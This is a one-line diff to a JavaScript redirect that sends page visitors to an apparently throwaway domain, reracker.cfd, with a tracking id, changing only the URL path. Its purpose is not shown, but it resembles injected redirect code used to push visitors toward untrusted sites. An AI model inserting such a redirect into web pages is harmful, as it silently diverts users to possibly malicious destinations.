@@ -1,1 +1,1 @@
-window.location.href = "https://reracker.cfd/jLe/go?sid=7747";
+window.location.href = "https://reracker.cfd/SsknU/go?sid=7747";
